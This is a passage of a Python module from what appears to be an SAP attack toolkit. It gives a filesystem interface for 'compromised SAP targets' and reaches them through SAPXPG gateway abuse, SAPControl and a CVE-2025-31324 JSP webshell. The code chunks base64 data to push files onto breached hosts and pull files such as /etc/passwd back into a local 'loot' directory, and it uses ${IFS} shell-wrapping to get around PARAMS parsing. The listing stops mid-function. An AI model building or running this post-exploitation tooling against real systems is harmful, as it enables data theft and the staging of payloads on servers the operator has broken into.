#!/usr/bin/env python3
"""sap_target_fs.py — unified filesystem interface for compromised SAP targets.

Issue #37 Phase 1: single module that provides ``upload / download /
list_dir / stat / mkdir`` on a target SAP application server through
any OS-exec channel SAPMAP has (GW SAPXPG, SXPG-authenticated,
CTCWebService, SAPControl, CVE-2025-31324 JSP webshell).  Every
transfer verifies integrity — MD5 round-trip on upload, byte-size
compare on download — so a silent SAPXPG PARAMS truncation or a
kernel-793 TLV cap doesn't leave a corrupted file on disk without
telling the operator.

Design goals:

1. **One class for the whole feature.**  All existing near-duplicates
   of "chunked base64 + python3/certutil decode" (see the survey in
   the issue #37 discussion for the 6+ copies) will get pointed at
   this in a follow-up refactor; for now it's additive.

2. **Channel-agnostic.**  Takes a caller-supplied ``exec_fn(program,
   args) -> {success, output, error}`` — same shape as
   :func:`sap_dpmon_sapstar.GwExecFn` and
   :func:`sap_pse_loot.GwExecFn`.  A convenience factory
   :func:`make_exec_fn_from_node` builds one from a
   :class:`SAPNode` + :class:`Credentials` by wrapping
   :func:`sapmap_exploit.execute_os_command` (which internally picks
   the best channel).

3. **Integrity always on.**  Every upload computes local MD5 →
   uploads → computes remote MD5 → hard-fails on mismatch.  Every
   download compares reassembled length vs the pre-fetched target
   file size.  Optional ``skip_integrity=True`` for one-off probes.

4. **PARAMS-budget aware.**  Chunk size is computed from the OS-side
   invocation form (bare python3, env-wrapped python3, cmd.exe
   echo) so we never overflow SAPXPG's 255-byte PARAMS field
   silently.  Reuses the same math the recent HANA writer fix
   introduced (:func:`sap_db_sql_writers._python3_split_spec`) —
   duplicated here as a small private helper so this module has no
   dependency on sap_db_sql_writers at import time.

5. **Cross-OS.**  ``os_family`` is detected from ``node.os_type`` at
   construction; each operation dispatches to Linux or Windows
   variants.  Both are fully implemented.  Windows uses cmd.exe
   for the listing / directory calls and ``certutil -encode/-decode``
   for chunked base64 file transfer.

6. **No exceptions on target errors.**  Returns
   ``{ok: bool, ...}`` dicts throughout — matches the rest of the
   SAPMAP post-ex modules.  Only genuine programming errors
   (bad argument types, mocks returning malformed dicts) raise.

The class holds no state beyond the (node, creds, exec_fn) triple
and a cached python3 spec after first use — no long-lived
sockets, no threads.  Safe to instantiate per-request from Bottle
handlers.
"""

from __future__ import annotations

import base64
import hashlib
import os
import re
import time
from typing import Callable, Optional


# Same shape as sap_dpmon_sapstar.GwExecFn / sap_pse_loot.GwExecFn.
# (program, args) -> {"success": bool, "output": list[str], "error": str}
ExecFn = Callable[[str, str], dict]


# SAPXPG PARAMS field size.  We reserve 5B for safety — see
# sap_db_sql_writers._write_hana_wrapper_via_gw for the full
# explanation of what a silent truncation costs (Julian's issue #8
# repro was exactly this).
_PARAMS_MAX = 255
_PARAMS_SAFETY = 5


# --------------------------------------------------------------------------
# python3 spec helpers
# --------------------------------------------------------------------------
#
# A "spec" is the python3 invocation string the caller wants used on
# the target — either a bare path ("/usr/bin/python3") or an
# env-wrapped form ("/usr/bin/env LD_LIBRARY_PATH=... /hana/.../
# python3") for HANA-shipped interpreters whose libpython3.X.so
# doesn't sit in ld.so.conf.  The caller passes this through so we
# don't have to re-probe on every upload/download call; higher-level
# code (the exploit orchestrator) already did the discovery once via
# sap_db_sql_writers._probe_python3_via_gw.  When no spec is given
# we default to "/usr/bin/python3" — works on 95%+ of modern SAP
# hosts, and the MD5 verify at the end will catch the case where it
# didn't.

def _split_python3_spec(spec: str) -> tuple:
    """Split ``spec`` into ``(program, args_prefix)`` for the
    (program, params) pair expected by ExecFn.

    Bare path::

        "/usr/bin/python3" → ("/usr/bin/python3", "")

    Env-wrapped for HANA-shipped python3::

        "/usr/bin/env LD_LIBRARY_PATH=/hana/... /hana/.../python3"
        → ("/usr/bin/env",
           "LD_LIBRARY_PATH=/hana/... /hana/.../python3")

    Callers concatenate the returned ``args_prefix`` (space-separated)
    in front of the python arguments when building the full PARAMS
    string.
    """
    if " " not in spec:
        return spec, ""
    first_space = spec.find(" ")
    return spec[:first_space], spec[first_space + 1:]


def _py3_chunk_size(python3_spec: str, tmp_path: str) -> int:
    """How many base64 characters we can pack into one chunk write
    without overflowing PARAMS.  Same formula as
    :func:`sap_db_sql_writers._write_hana_wrapper_via_gw` — kept in
    lock-step so bug fixes in either helper transfer trivially.
    """
    _cmd, prefix = _split_python3_spec(python3_spec)
    body_overhead = len(f"-c open('{tmp_path}','ab').write(b'')")
    prefix_overhead = (len(prefix) + 1) if prefix else 0
    return _PARAMS_MAX - prefix_overhead - body_overhead - _PARAMS_SAFETY


def _py3_params(python3_spec: str, python_args: str) -> tuple:
    """Build the (program, params) pair for ``exec_fn`` when running
    ``python3 <python_args>``.  Handles the env-wrap prefix transparently."""
    cmd, prefix = _split_python3_spec(python3_spec)
    params = f"{prefix} {python_args}" if prefix else python_args
    return cmd, params


# --------------------------------------------------------------------------
# TargetFS
# --------------------------------------------------------------------------

class TargetFS:
    """Filesystem interface for a compromised SAP target.

    Instantiate per-operation (cheap — no state beyond three refs
    plus a lazy python3 spec cache).  All public methods return a
    dict with an ``ok: bool`` key; callers should always branch on
    that rather than expecting exceptions.
    """

    def __init__(self, node, exec_fn: ExecFn,
                 os_family: Optional[str] = None,
                 python3_spec: Optional[str] = None,
                 label: str = ""):
        """
        Args:
          node: A :class:`SAPNode` — used only for label / logging;
                the exec channel is fully abstracted by ``exec_fn``.
          exec_fn: ``(program, args) -> {success, output, error}`` —
                the same shape as sap_dpmon_sapstar.GwExecFn.  Every
                target-side command flows through this.
          os_family: ``"linux"`` or ``"windows"``.  Auto-detected
                from ``node.os_type`` if not supplied.
          python3_spec: Either a bare path ("/usr/bin/python3") or
                an env-wrapped form ("/usr/bin/env LD_LIBRARY_PATH=...
                /hana/.../python3") for HANA-shipped interpreters.
                Only used on Linux targets.
          label: Prefix for every progress ``print`` line.  Defaults
                to the node's SID so multi-target sessions stay
                readable in the console.
        """
        self.node = node
        self.exec_fn = exec_fn
        self.os_family = (os_family or self._detect_os(node)).lower()
        if self.os_family not in ("linux", "windows"):
            self.os_family = "linux"
        # python3_spec is now lazy — probed on first upload via
        # _ensure_python3_spec.  Callers may pass an explicit spec
        # (tests do) to skip discovery.
        self.python3_spec = python3_spec
        self._python3_probed = python3_spec is not None
        self.label = label or getattr(node, "sid", "?")

    def _ensure_python3_spec(self) -> Optional[str]:
        """Lazy-probe a working python3 on the target.  Reuses the
        battle-tested probe from :mod:`sap_dpmon_sapstar` so we pick up
        HANA-shipped interpreters under
        ``/hana/shared/<HDB_SID>/exe/<arch>/hdb/Python3/bin/python3`` —
        same fix as Julian's issue #8.  Returns the resolved spec
        (bare path or env-wrapped) or ``None`` when no python3 exists
        on the target."""
        if self._python3_probed:
            return self.python3_spec
        try:
            from sap_dpmon_sapstar import _probe_python3_via_exec_fn
            sid = getattr(self.node, "sid", "?")
            spec = _probe_python3_via_exec_fn(self.exec_fn, sid=sid,
                                                label=self.label,
                                                context="file browser")
        except Exception as e:
            print(f"[-] {self.label}: python3 probe error: {e!r}")
            spec = None
        self.python3_spec = spec
        self._python3_probed = True
        return spec

    @staticmethod
    def _detect_os(node) -> str:
        """Guess Linux vs Windows from ``node.os_type``.  Falls back
        to Linux — most SAP application servers run Linux, and the
        Linux implementation errors cleanly against Windows targets
        (python3 probe fails, MD5 verify catches it)."""
        t = (getattr(node, "os_type", "") or "").lower()
        if any(w in t for w in ("windows", "nt", "win")):
            return "windows"
        return "linux"

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def upload(self, local_path: str, remote_path: str,
                skip_integrity: bool = False,
                progress_cb: "Optional[Callable[[int,int,str],None]]" = None
                ) -> dict:
        """Push a local file to the target.

        Returns::

            {
              ok:          bool,
              bytes:       int,    # local file size
              md5_local:   str,    # local MD5 hex
              md5_remote:  str,    # remote MD5 hex (empty if skip_integrity)
              elapsed:     float,  # seconds
              error:       str,    # populated when ok=False
              chunks:      int,    # number of chunks used
              chunk_size:  int,    # bytes per chunk (base64 pre-decode)
            }
        """
        t0 = time.time()
        try:
            with open(local_path, "rb") as fh:
                content = fh.read()
        except Exception as e:
            return {"ok": False, "error": f"local read failed: {e!r}"}
        md5_local = hashlib.md5(content).hexdigest()

        if self.os_family == "windows":
            result = self._upload_windows(remote_path, content,
                                            progress_cb=progress_cb)
        else:
            # Linux path: chunked b64 write via python3 + b64decode + verify
            result = self._upload_linux(remote_path, content,
                                          progress_cb=progress_cb)
        result["bytes"] = len(content)
        result["md5_local"] = md5_local
        result["elapsed"] = round(time.time() - t0, 2)

        if not result.get("ok"):
            return result

        # Remote MD5 verify
        if skip_integrity:
            result["md5_remote"] = ""
            return result
        if progress_cb:
            try:
                progress_cb(len(content), len(content), "verify")
            except Exception:
                pass
        if self.os_family == "windows":
            md5_remote = self._remote_md5_windows(remote_path)
        else:
            md5_remote = self._remote_md5_linux(remote_path)
        result["md5_remote"] = md5_remote
        if md5_remote and md5_remote != md5_local:
            result["ok"] = False
            result["error"] = (f"MD5 mismatch — local={md5_local} "
                                f"remote={md5_remote} — file corrupted "
                                f"in transit")
        elif not md5_remote:
            result["ok"] = False
            result["error"] = ("could not compute remote MD5 (md5sum "
                                "output unreadable via exec channel) "
                                "— cannot verify integrity")
        return result

    def download(self, remote_path: str,
                  loot_dir: Optional[str] = None,
                  loot_subdir: str = "fs",
                  max_size: int = 100 * 1024 * 1024,
                  progress_cb: "Optional[Callable[[int,int,str],None]]" = None
                  ) -> dict:
        """Fetch a file from the target and save it under ``loot/``.

        Args:
          remote_path: Absolute path on the target.
          loot_dir: Base loot directory.  When ``None`` uses the
                canonical ``sapmap_state.ensure_loot_dir(loot_subdir)``
                so the file lands under ``loot/fs/<sid>/<ts>/``.
                Pass an explicit path to force a specific location
                (used by tests + REST handler).
          loot_subdir: Subdirectory under ``loot/`` when
                ``loot_dir`` is None.
          max_size: Hard cap on the target file size (default 100 MB).
                Larger files fail cleanly — chunked reads over
                SAPXPG scale linearly with size and would spend
                hours before finishing on a multi-GB log.
          progress_cb: Optional ``callable(done, total, phase)`` where
                ``done`` and ``total`` are byte counts and ``phase`` is
                one of ``"stat" | "single_shot" | "chunked" | "done"``.
                Called at least once per chunk on the chunked path so
                the GUI can render a foreground progress bar; the
                single-shot base64 path calls it twice
                (``phase="single_shot"`` at 0% and 100%).

        Returns::

            {
              ok:         bool,
              loot_path:  str,    # absolute path where bytes landed
              bytes:      int,    # transferred bytes
              md5:        str,    # of the fetched bytes
              elapsed:    float,
              error:      str,
            }
        """
        t0 = time.time()

        # Windows and Linux share the size-check + loot-write flow;
        # only the actual byte-fetching differs.
        _download_fn = (self._download_windows
                        if self.os_family == "windows"
                        else self._download_linux)

        # Pre-flight: file size
        size_info = self.stat(remote_path)
        if not size_info.get("ok"):
            return {"ok": False, "error":
                     f"stat failed: {size_info.get('error', '?')}"}
        if not size_info.get("exists"):
            return {"ok": False, "error":
                     f"remote file does not exist: {remote_path}"}
        if size_info.get("is_dir"):
            return {"ok": False, "error":
                     f"remote path is a directory: {remote_path}"}
        size = size_info["size"]
        if size > max_size:
            return {"ok": False, "error":
                     f"file too large ({size} bytes > cap {max_size}) "
                     f"— pass a larger max_size to override"}
        if size == 0:
            # Empty file — no reading needed, just write an empty
            # loot file and return.  Chunked read would spin forever.
            loot_path = self._loot_path(remote_path, loot_dir, loot_subdir)
            with open(loot_path, "wb"):
                pass
            return {"ok": True, "loot_path": loot_path, "bytes": 0,
                     "md5": hashlib.md5(b"").hexdigest(),
                     "elapsed": round(time.time() - t0, 2)}

        # Chunked base64 read
        self._last_download_error = ""
        content = _download_fn(remote_path, size,
                                progress_cb=progress_cb)
        if content is None:
            err = getattr(self, "_last_download_error", "") \
                or "chunked read failed — see console output"
            return {"ok": False, "error": err}
        if len(content) != size:
            return {"ok": False, "error":
                     f"size mismatch after reassembly: "
                     f"got {len(content)} bytes, expected {size}"}

        loot_path = self._loot_path(remote_path, loot_dir, loot_subdir)
        with open(loot_path, "wb") as fh:
            fh.write(content)
        return {
            "ok":        True,
            "loot_path": loot_path,
            "bytes":     len(content),
            "md5":       hashlib.md5(content).hexdigest(),
            "elapsed":   round(time.time() - t0, 2),
        }

    def list_dir(self, remote_path: str) -> dict:
        """List the contents of a directory.  Returns::

            {
              ok:       bool,
              path:     str,
              entries:  [{name, size, is_dir, mtime, mode}, ...],
              error:    str,
            }
        """
        if self.os_family == "windows":
            return self._list_dir_windows(remote_path)
        return self._list_dir_linux(remote_path)

    def stat(self, remote_path: str) -> dict:
        """Get metadata for a single path.  Returns::

            {
              ok:      bool,
              exists:  bool,
              size:    int,
              is_dir:  bool,
              mtime:   str,   # ISO8601 or empty
              mode:    str,   # octal string or ls-style
              error:   str,
            }

        ``ok=True`` + ``exists=False`` is a valid response (target
        readback worked, file just isn't there).
        """
        if self.os_family == "windows":
            return self._stat_windows(remote_path)
        return self._stat_linux(remote_path)

    def mkdir(self, remote_path: str, parents: bool = True) -> dict:
        """Create a directory on the target.  Returns::

            {ok: bool, error: str}
        """
        if self.os_family == "windows":
            return self._mkdir_windows(remote_path)
        args = f"-p {remote_path}" if parents else remote_path
        r = self.exec_fn("/bin/mkdir", args)
        if r.get("success"):
            return {"ok": True, "error": ""}
        # mkdir non-zero → error stream carries the message
        err = " ".join(r.get("output", [])) or r.get("error", "?")
        return {"ok": False, "error": err[:200]}

    # ------------------------------------------------------------------
    # Linux implementations
    # ------------------------------------------------------------------

    def _upload_linux(self, remote_path: str, content: bytes,
                        progress_cb: "Optional[Callable[[int,int,str],None]]" = None
                        ) -> dict:
        """Chunked base64 write via python3 + b64decode.  Same recipe
        as ``sap_db_sql_writers._chunked_b64_write_via_python3`` — kept
        as a private method here so this module stays standalone."""
        # Probe python3 lazily so upload works on HANA hosts where
        # /usr/bin/python3 is absent but /hana/shared/<HDB_SID>/exe/.../
        # python3 exists.
        spec = self._ensure_python3_spec()
        if not spec:
            return {"ok": False,
                     "error": ("no python3 discovered on target — "
                               "upload requires python3 for chunked "
                               "base64 write.  Install python3 or "
                               "authenticate first."),
                     "chunks": 0, "chunk_size": 0}

        b64 = base64.b64encode(content).decode("ascii")
        b64_path = remote_path + ".b64"

        # Wipe stale
        self.exec_fn("/bin/rm", f"-f {remote_path} {b64_path}")

        # Chunk size derived from python3 spec length so env-wrapped
        # HANA python3 doesn't overflow PARAMS.
        chunk_size = _py3_chunk_size(self.python3_spec, b64_path)
        if chunk_size < 20:
            return {"ok": False,
                     "error": f"PARAMS budget exhausted — python3 "
                     f"spec + write body leave only {chunk_size}B "
                     f"for base64 chunk (need ≥20B)",
                     "chunks": 0, "chunk_size": chunk_size}

        chunks = [b64[i:i + chunk_size]
                   for i in range(0, len(b64), chunk_size)]
        total_bytes = len(content)

        def _emit(done: int, phase: str) -> None:
            if progress_cb:
                try:
                    progress_cb(done, total_bytes, phase)
                except Exception:
                    pass

        _emit(0, "chunked")
        for i, chunk in enumerate(chunks):
            mode = "wb" if i == 0 else "ab"
            body = f"-c open('{b64_path}','{mode}').write(b'{chunk}')"
            cmd, params = _py3_params(self.python3_spec, body)
            r = self.exec_fn(cmd, params)
            if not r.get("success"):
                self.exec_fn("/bin/rm", f"-f {b64_path}")
                return {"ok": False,
                         "error": f"chunk {i + 1}/{len(chunks)} "
                         f"failed at exec: {r.get('error', '?')}",
                         "chunks": i, "chunk_size": chunk_size}
            # Map chunk-index → decoded-bytes-written so the bar
            # tracks the local file size rather than the 4/3-inflated
            # base64 stream.  Last chunk clamps to total_bytes.
            done_est = min(total_bytes,
                            ((i + 1) * total_bytes) // len(chunks))
            _emit(done_est, "chunked")

        # Decode base64 → final file
        decode_body = (
            f"-c open('{remote_path}','wb').write("
            f"__import__('base64').b64decode(open('{b64_path}',"
            f"'rb').read()))")
        cmd, params = _py3_params(self.python3_spec, decode_body)
        r = self.exec_fn(cmd, params)
        if not r.get("success"):
            self.exec_fn("/bin/rm", f"-f {b64_path}")
            return {"ok": False,
                     "error": f"decode failed: {r.get('error', '?')}",
                     "chunks": len(chunks), "chunk_size": chunk_size}

        # Cleanup
        self.exec_fn("/bin/rm", f"-f {b64_path}")
        return {"ok": True, "error": "",
                 "chunks": len(chunks), "chunk_size": chunk_size}

    def _remote_md5_linux(self, remote_path: str) -> str:
        """Return the target's MD5 hex for ``remote_path`` (empty
        string on any failure — caller treats empty as "couldn't
        verify")."""
        # Try md5sum first (universal on Linux).  Output format:
        # "d41d8cd98f00b204e9800998ecf8427e  /tmp/foo"
        r = self.exec_fn("/usr/bin/md5sum", remote_path)
        for line in r.get("output", []):
            m = re.match(r"^([0-9a-f]{32})\s+", line.strip())
            if m:
                return m.group(1)
        # Fallback: openssl md5 -r (some minimal hosts don't have
        # md5sum but do ship openssl)
        r = self.exec_fn("/usr/bin/openssl", f"md5 -r {remote_path}")
        for line in r.get("output", []):
            m = re.match(r"^([0-9a-f]{32})\s+", line.strip())
            if m:
                return m.group(1)
        return ""

    def _download_linux(self, remote_path: str, size: int,
                          progress_cb: Optional[Callable] = None
                          ) -> Optional[bytes]:
        """Download a file from the target as base64.

        Strategy (tried in order — first success wins):

        1. ``/usr/bin/base64 <path>`` — universal on Linux (part of
           GNU coreutils, present on RHEL / SLES / Debian / hardened
           SAP appliances).  Single command, no python3 dependency.
           Base64 output naturally wraps at 76 chars/line so it
           survives the kernel-793 TLV ~128B/line cap without any
           slicing.  This is the fast path — works for the vast
           majority of downloads.

        2. python3 chunked read — same slicing pattern as
           :func:`sap_pse_loot._read_chunked`.  Only reached when
           /usr/bin/base64 is absent AND python3 was discovered by
           the probe.  Slices the file by byte offset and prints one
           b64-encoded chunk at a time, each small enough to survive
           TLV truncation.

        Returns the reassembled bytes, or ``None`` when both paths
        failed.  Prints diagnostic output on every intermediate
        failure so the operator can see which channel was tried.
        """
        # --- Path 1: /usr/bin/base64 (no python3 required) ------------
        # SAPXPG's stdout capture can silently drop the tail of long
        # outputs — a 76-char/line b64 stream from a multi-KB file
        # arrives short and the size-check catches it.  If instead
        # only INTERIOR lines are dropped, the total length is not a
        # multiple of 4 and decoding raises "Incorrect padding"; we
        # pad with '=' and retry with validate=False so the partial
        # data is still recovered and the size-check decides what to
        # do next.
        def _emit(done: int, phase: str) -> None:
            if progress_cb:
                try:
                    progress_cb(done, size, phase)
                except Exception:
                    pass

        _emit(0, "single_shot")
        base64_paths = ("/usr/bin/base64", "/bin/base64",
                         "/usr/local/bin/base64")
        for b64_bin in base64_paths:
            r = self.exec_fn(b64_bin, remote_path)
            out_lines = r.get("output", [])
            if not out_lines:
                continue
            first_lo = out_lines[0].lower()
            if ("no such file" in first_lo or "cannot open" in first_lo
                    or "not found" in first_lo):
                # base64 binary present but the target file isn't
                print(f"[-] {self.label}: {b64_bin}: {out_lines[0].strip()}")
                continue
            b64_blob = "".join(out_lines)
            b64_clean = re.sub(r"[^A-Za-z0-9+/=]", "", b64_blob)
            if not b64_clean:
                continue
            # Pad to a multiple of 4 and use lenient decode — the
            # SAPXPG stream can drop bytes without warning.
            padded = b64_clean.rstrip("=") \
                + "=" * ((4 - len(b64_clean.rstrip("=")) % 4) % 4)
            try:
                decoded = base64.b64decode(padded, validate=False)
            except Exception as e:
                print(f"[-] {self.label}: {b64_bin} b64 decode error: "
                      f"{e!r} — trying next path")
                continue
            if len(decoded) == size:
                print(f"[+] {self.label}: downloaded via {b64_bin} "
                      f"({size} B, single-shot)")
                _emit(size, "single_shot")
                return decoded
            print(f"[-] {self.label}: {b64_bin} returned "
                  f"{len(decoded)} B, expected {size} — "
                  f"SAPXPG probably truncated stdout, falling back "
                  f"to python3 chunked read")
            break

        # --- Path 2: python3 chunked read ------------------------------
        spec = self._ensure_python3_spec()
        if not spec:
            print(f"[-] {self.label}: no /usr/bin/base64 AND no python3 "
                  f"— cannot download {remote_path}.  Install "
                  f"coreutils base64 or python3 on the target.")
            return None

        # 72 raw bytes → 96 base64 chars, safely under the 128B TLV
        # ceiling most kernels enforce.  Same value used by
        # sap_pse_loot for the same reason.
        RAW_CHUNK = 72
        # Emit progress at ~10 evenly-spaced points so a multi-MB
        # download doesn't look wedged.
        n_chunks = (size + RAW_CHUNK - 1) // RAW_CHUNK
        progress_every = max(1, n_chunks // 10)
        print(f"[*] {self.label}: chunked download of {remote_path} "
              f"({size} B, {n_chunks} chunks of {RAW_CHUNK} B via {spec})")
        _emit(0, "chunked")
        parts = []
        offset = 0
        chunk_idx = 0
        while offset < size:
            end = min(offset + RAW_CHUNK, size)
            # Use print() not sys.stdout.write() — print() auto-flushes
            # via the atexit handler even when the subprocess is
            # killed early by SAPXPG timeouts (Julian's issue #8
            # showed sys.stdout.write() silently losing output when
            # sapxpg dropped the child mid-flight).
            body = (f"-c "
                     f"print(__import__('base64').b64encode("
                     f"open('{remote_path}','rb').read()[{offset}:{end}]"
                     f").decode())")
            cmd, params = _py3_params(spec, body)
            r = self.exec_fn(cmd, params)
            b64_blob = "".join(r.get("output", []))
            b64_clean = re.sub(r"[^A-Za-z0-9+/=]", "", b64_blob)
            if not b64_clean:
                # First-chunk empty is worth diagnosing: dump the raw
                # output list so the operator can see whether python3
                # crashed with a permission error, exec channel died,
                # etc.  Without this the failure looks like a mystery.
                raw = r.get("output", [])
                err = r.get("error", "")
                print(f"[-] {self.label}: chunk at offset {offset} "
                      f"returned empty — download aborted")
                print(f"[-] {self.label}:   exec success={r.get('success')} "
                      f"error={err[:120]!r}")
                print(f"[-] {self.label}:   raw output lines "
                      f"({len(raw)}): "
                      f"{[l[:80] for l in raw[:3]]}")
                # Try to help the operator: verify python3 is actually
                # runnable by running a trivial print.
                probe = self.exec_fn(cmd, "-c print(42)")
                probe_out = probe.get("output", [])
                if not any("42" in ln for ln in probe_out):
                    print(f"[-] {self.label}:   python3 probe "
                          f"'print(42)' also failed — interpreter "
                          f"unusable via this channel.  Try SXPG "
                          f"(create credentials + escalate first).")
                else:
                    print(f"[-] {self.label}:   python3 probe "
                          f"'print(42)' succeeded — likely a read "
                          f"permission issue on {remote_path} for "
                          f"the exec channel's user (<sid>adm).")
                return None
            # Lenient decode — pad to multiple of 4 first
            padded = b64_clean.rstrip("=") \
                + "=" * ((4 - len(b64_clean.rstrip("=")) % 4) % 4)
            try:
                parts.append(base64.b64decode(padded, validate=False))
            except Exception as e:
                print(f"[-] {self.label}: chunk at offset {offset} "
                      f"b64 decode failed: {e!r}")
                return None
            offset = end
            chunk_idx += 1
            _emit(end, "chunked")
            if chunk_idx == 1 or chunk_idx == n_chunks \
                    or chunk_idx % progress_every == 0:
                pct = (chunk_idx * 100) // n_chunks
                print(f"[*] {self.label}: chunk {chunk_idx}/{n_chunks} "
                      f"({pct}%) — {end}/{size} B")
        return b"".join(parts)

    def _list_dir_linux(self, remote_path: str) -> dict:
        """Parse a directory listing.

        Three strategies are tried in order — the first one that
        returns parseable output wins:

        1. ``ls -la --time-style=+%Y-%m-%dT%H:%M:%S <path>`` — GNU
           coreutils with ISO-style timestamps.
        2. ``ls -la <path>`` — bare ``-la`` for BSD ls / minimal
           busybox where ``--time-style`` may error out.
        3. ``find <path> -maxdepth 1 -mindepth 1 -printf "..."`` — the
           SAPXPG-friendly fallback.  ``ls -la`` output on populous
           dirs (/tmp, /etc, /var/log) routinely overflows SAPXPG's
           stdout capture and the entire response comes back empty.
           ``find -printf`` produces a much tighter one-line-per-entry
           format (~40 B/entry vs ~80 for ls) that fits under the
           buffer cap, and %f gives the basename only so filenames
           with spaces or absolute paths (single-file listing case)
           don't confuse downstream path-joining.

        Special case: if ``remote_path`` turns out to be a file (not
        a directory), a single-entry result is returned so the UI
        can offer the file for download.

        Result entries are deduplicated by (name, mode, size).
        SAPXPG on kernel 793+ echoes each stdout line twice (P3 + P4
        TLV frames), which would otherwise show every entry twice.
        """
        # Short-circuit: if path is a file, stat it and return a
        # single entry — /etc/passwd and friends land here when the
        # operator types the full file path in the address bar.
        st = self._stat_linux(remote_path)
        if st.get("ok") and st.get("exists") and not st.get("is_dir"):
            basename = os.path.basename(remote_path.rstrip("/")) \
                        or remote_path
            return {"ok": True, "path": remote_path,
                     "entries": [{
                        "name":   basename,
                        "size":   st.get("size", 0),
                        "is_dir": False,
                        "mtime":  st.get("mtime", ""),
                        "mode":   st.get("mode", ""),
                        # Preserve the absolute path for the UI so
                        # the download button doesn't try to join.
                        "abs_path": remote_path,
                     }],
                     "error": ""}

        r = self.exec_fn("/bin/ls",
                          f"-la --time-style=+%Y-%m-%dT%H:%M:%S "
                          f"{remote_path}")
        lines = r.get("output", []) or []

        # Detect "no such file" in the first line before deciding to
        # retry — no point re-running an ls that will fail the same
        # way.
        if lines:
            first = lines[0].lower()
            if "cannot access" in first or "no such" in first:
                return {"ok": False, "path": remote_path,
                         "entries": [], "error": lines[0].strip()}

        # Retry with bare -la when nothing came back or when parsing
        # yields zero entries (BSD ls silently ignores --time-style
        # on some builds; SAPXPG can drop the whole output on others).
        needs_retry = (not lines) or all(
            _parse_ls_line(l) is None for l in lines
        )
        if needs_retry:
            r2 = self.exec_fn("/bin/ls", f"-la {remote_path}")
            lines2 = r2.get("output", []) or []
            if lines2:
                first2 = lines2[0].lower()
                if "cannot access" in first2 or "no such" in first2:
                    return {"ok": False, "path": remote_path,
                             "entries": [],
                             "error": lines2[0].strip()}
                lines = lines2

        # --- Strategy 2b: shell-wrapped ls -la ---------------------
        # Direct /bin/ls calls return empty on GW SAPXPG for some
        # dirs (SAPXPG stdout capture quirk). Shell-wrapping via
        # /bin/sh -c with ${IFS} as separator is proven to work
        # (the OS terminal in sapmap_gui uses the same pattern).
        need_sh = (not lines) or all(
            _parse_ls_line(l) is None for l in lines
        )
        if need_sh:
            p = remote_path
            r3 = self.exec_fn(
                "/bin/sh",
                f"-c ls${{IFS}}-la${{IFS}}"
                f"--time-style=+%Y-%m-%dT%H:%M:%S${{IFS}}{p}")
            lines3 = r3.get("output", []) or []
            if lines3:
                first3 = lines3[0].lower()
                if "cannot access" in first3 or "no such" in first3:
                    return {"ok": False, "path": remote_path,
                             "entries": [],
                             "error": lines3[0].strip()}
                lines = lines3

        # --- Strategy 3: names-only listing + batched stat ----------
        # Kicks in when all ls -la variants overflowed SAPXPG's
        # stdout buffer (very common on /tmp, /etc, /var/log with
        # dozens or hundreds of entries).  Multiple bare-name
        # commands are tried in order of preference; the first one
        # that returns anything wins.  Metadata is then filled in
        # via batched stat calls (~10 names per batch).
        need_names = (not lines) or all(
            _parse_ls_line(l) is None for l in lines
        )
        if need_names:
            names_entries = self._list_dir_via_names(remote_path)
            if names_entries:
                return {"ok": True, "path": remote_path,
                         "entries": names_entries, "error": ""}

        if not lines:
            return {"ok": False, "path": remote_path, "entries": [],
                     "error": (f"ls / find / ls -1 all returned no "
                               f"parseable output for {remote_path} "
                               f"— the exec channel dropped its "
                               f"stdout.  Check the console for the "
                               f"raw output diagnostics.")}

        entries = []
        seen = set()
        for line in lines:
            e = _parse_ls_line(line)
            if not e:
                continue
            key = (e["name"], e.get("mode", ""), e.get("size", -1))
            if key in seen:
                continue
            seen.add(key)
            entries.append(e)
        return {"ok": True, "path": remote_path, "entries": entries,
                 "error": ""}

    def _list_dir_via_names(self, remote_path: str) -> Optional[list]:
        """Names-first fallback for populous dirs on SAPXPG.

        The operator confirmed ``ls -1 /tmp`` works over GW SAPXPG
        **when shell-wrapped** (``/bin/sh -c ls${IFS}-1${IFS}/tmp``)
        but returns empty when calling ``/bin/ls`` directly with
        ``-1 /tmp``.  This is a SAPXPG stdout-capture quirk: the
        P3/P4 TLV output frames are populated differently for
        direct-exec vs shell-wrapped programs on some kernels.

        Shell-wrapped candidates use ``${IFS}`` as the space
        separator (same pattern as the OS terminal in sapmap_gui)
        so SAPXPG's PARAMS field carries no literal spaces that the
        kernel could mis-split.

        Commands tried in order (whichever returns names first wins):

        1-4. Shell-wrapped ``ls`` variants via ``/bin/sh -c``
        5-8. Direct ``/bin/ls`` variants (for non-GW channels)
        9-10. ``find`` as a last resort

        Trade-off: 1 + ceil(N / BATCH) GW round trips instead of 1
        for ls -la.  For /tmp with ~100 entries that's ~11 calls
        (~30-60 s) — slow but working.  SXPG-authenticated is
        immune and skips this whole path.
        """
        p = remote_path
        candidates = [
            ("/bin/sh", f"-c ls${{IFS}}-1${{IFS}}{p}",
                "sh:ls -1"),
            ("/bin/sh", f"-c ls${{IFS}}-1${{IFS}}-a${{IFS}}{p}",
                "sh:ls -1 -a"),
            ("/bin/sh", f"-c ls${{IFS}}{p}",
                "sh:ls"),
            ("/bin/sh", f"-c ls${{IFS}}-a${{IFS}}{p}",
                "sh:ls -a"),
            ("/bin/ls", f"-1 {p}",        "ls -1"),
            ("/bin/ls", f"-1 -a {p}",     "ls -1 -a"),
            ("/bin/ls", f"{p}",           "ls"),
            ("/bin/ls", f"-a {p}",        "ls -a"),
            ("/usr/bin/find",
                f"{p} -maxdepth 1 -mindepth 1", "find"),
            ("/bin/find",
                f"{p} -maxdepth 1 -mindepth 1", "find"),
        ]
        for prog, args, tag in candidates:
            r = self.exec_fn(prog, args)
            lines = r.get("output", []) or []
            if not lines:
                continue
            first_lo = lines[0].lower()
            if ("no such" in first_lo or "cannot access" in first_lo
                    or "not a directory" in first_lo):
                # Fatal error — path is bad; abort the whole chain.
                return None
            if "paths must precede" in first_lo \
                    or "possible unquoted" in first_lo \
                    or "invalid option" in first_lo \
                    or "unrecognized option" in first_lo:
                # Tool-level error (SAPXPG mangling / BSD variant);
                # try the next command.
                print(f"[-] {self.label}: {tag} rejected — "
                      f"{lines[0].strip()[:100]}")
                continue

            names = self._extract_names(lines, remote_path, tag)
            if not names:
                continue

            print(f"[*] {self.label}: {tag} → {len(names)} names in "
                  f"{remote_path}; batched-stat for metadata")
            entries = self._batched_stat(remote_path, names)
            print(f"[*] {self.label}: names fallback ({tag}) → "
